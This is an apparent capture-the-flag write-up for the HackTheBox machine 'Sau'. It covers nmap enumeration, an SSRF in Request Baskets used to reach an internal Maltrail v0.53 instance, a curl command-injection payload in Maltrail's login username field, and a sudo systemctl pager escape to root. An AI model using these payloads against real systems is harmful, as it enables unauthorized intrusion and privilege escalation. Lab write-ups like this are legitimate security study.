 </br>[![Typing SVG](https://readme-typing-svg.demolab.com?font=Fira+Code&size=35&pause=1000&color=6A0DAD&width=435&lines=Sau-HackTheBox)](https://git.io/typing-svg)
</br>
![image](https://github.com/ACHUX21/Writeups/assets/130113878/28702117-6795-465c-9527-a4054c414a7e)

# Enumeration

```bash
# Nmap 7.80 scan initiated Sun Jul  9 20:56:56 2023 as: nmap -sCV -oN Nmap -p- -vvv 10.10.11.224
Nmap scan report for 10.10.11.224
Host is up, received echo-reply ttl 63 (0.31s latency).
Scanned at 2023-07-09 20:56:56 +01 for 585s
Not shown: 65531 closed ports
Reason: 65531 resets
PORT      STATE    SERVICE REASON         VERSION
22/tcp    open     ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp    filtered http    no-response
8338/tcp  filtered unknown no-response
55555/tcp open     unknown syn-ack ttl 63
| fingerprint-strings: 
|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 302 Found
|     Content-Type: text/html; charset=utf-8
|     Location: /web
|     Date: Sun, 09 Jul 2023 20:05:50 GMT
|     Content-Length: 27
|     href="/web">Found</a>.
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Allow: GET, OPTIONS
|     Date: Sun, 09 Jul 2023 20:05:51 GMT
|_    Content-Length: 0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port55555-TCP:V=7.80%I=7%D=7/9%Time=64AB131E%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,A2,"HTTP/1\.0\x20302\x20Found\r\nContent-Type:\x20text/html;\x
SF:20charset=utf-8\r\nLocation:\x20/web\r\nDate:\x20Sun,\x2009\x20Jul\x202
SF:023\x2020:05:50\x20GMT\r\nContent-Length:\x2027\r\n\r\n<a\x20href=\"/we
SF:b\">Found</a>\.\n\n")%r(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Req
SF:uest\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x2
SF:0close\r\n\r\n400\x20Bad\x20Request")%r(HTTPOptions,60,"HTTP/1\.0\x2020
SF:0\x20OK\r\nAllow:\x20GET,\x20OPTIONS\r\nDate:\x20Sun,\x2009\x20Jul\x202
SF:023\x2020:05:51\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRequest,
SF:67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\
SF:x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")
SF:%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text
SF:/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20R
SF:equest")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCont
SF:ent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r
SF:\n400\x20Bad\x20Request")%r(TerminalServerCookie,67,"HTTP/1\.1\x20400\x
SF:20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nCo
SF:nnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TLSSessionReq,67,"H
SF:TTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20ch
SF:arset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(Ke
SF:rberos,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/
SF:plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Re
SF:quest");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jul  9 21:06:41 2023 -- 1 IP address (1 host up) scanned in 584.89 seconds
```
</br>

[! POC](https://github.com/darklynx/request-baskets)

During my reconnaissance phase, I discovered a website that utilizes the Request Baskets service. 
</br>
This web service provides me with the flexibility to collect and examine HTTP requests through either a RESTful API or a user-friendly web interface

![image](https://github.com/ACHUX21/Writeups/assets/130113878/560e444d-8bd9-4daa-82ee-7dd6e301d54f)

An intriguing detail we observed is that the service we stumbled upon is running an outdated version, whereas the most recent version available is 1.2.3. 
This divergence raises the possibility of potential vulnerabilities that we can exploit during our exploitation process.

![image](https://github.com/ACHUX21/Writeups/assets/130113878/77afb146-755e-423f-a258-df1685262d36)

While conducting the vulnerability assessment for this particular system version, I discovered an SSRF (Server-Side Request Forgery) vulnerability.
This vulnerability exposes a significant risk as it allows for the unauthorized disclosure of confidential information, including port enumeration.

```json
{
  "forward_url": "http://127.0.0.1:80/test",
  "proxy_response": false,
  "insecure_tls": false,
  "expand_path": true,
  "capacity": 250
}
```

Following the outlined steps in the documentation, I proceeded to create a new basket. 
However, I deviated from the default GET request method and modified it to a POST request, making the following adjustments.

By leveraging the SSRF vulnerability, I successfully created a targeted route that allowed me access. 
Within this route, I proceeded to exploit the SSRF vulnerability further, capitalizing on its weaknesses.

![image](https://github.com/ACHUX21/Writeups/assets/130113878/206e245e-494a-4b22-be1b-e8c6a94c4074)

```http://10.10.11.224:55555/web/achux21```

![image](https://github.com/ACHUX21/Writeups/assets/130113878/0f5c895b-8629-4e65-aaab-5758f0eb10b7)

![image](https://github.com/ACHUX21/Writeups/assets/130113878/f00be81b-f91e-4cda-9769-bcab86f16cb8)


While accessing the route generated by exploiting the SSRF vulnerability, we came across the Maltrail application.
Maltrail serves as a robust system for detecting and analyzing malicious network traffic. 
It relies on public lists containing suspicious and malicious traces, as well as static traces obtained from reports by various antivirus providers
However, it is essential to highlight that the version of Maltrail we encountered is outdated, potentially implying the presence of unaddressed vulnerabilities.

[Matrail V0.53](https://github.com/stamparm/maltrail)


During the analysis, I discovered an unauthenticated command execution vulnerability within the Maltrail application. 
This vulnerability resides in the subprocess.check_output function, specifically in the file mailtrail/core/httpd.py.
The root cause of this vulnerability is a command injection flaw present in the params.get("username") parameter.

[https://vulners.com/huntr/BE3C5204-FBD9-448D-B97C-96A8D2941E87](https://vulners.com/huntr/BE3C5204-FBD9-448D-B97C-96A8D2941E87)

![image](https://github.com/ACHUX21/Writeups/assets/130113878/3bde8930-a81e-4cd6-9122-698c80fcd9fc)

By exploiting this vuln we could have a remote code execution.

```bash
curl 'http://hostname:8338/login' \
  --data 'username=;`id &gt; /tmp/bbq`'
```
![image](https://github.com/ACHUX21/Writeups/assets/130113878/465aa762-6566-4472-bb11-f89508166417)

# Privilege Escalation

it's time to focus on privilege escalation.

```bash
script /dev/null -c bash
sudo  /usr/bin/systemctl status trail.service
!sh
```


```bash
script /dev/null -c bash
sudo  /usr/bin/systemctl status trail.service
!sh
```
![image](https://github.com/ACHUX21/Writeups/assets/130113878/9a551f35-dead-4e8e-9715-9c248c2d006a)


```bash
sudo -l
```
![image](https://github.com/ACHUX21/Writeups/assets/130113878/28b72b20-2633-492a-b25c-ab9a253db14a)

 BYE
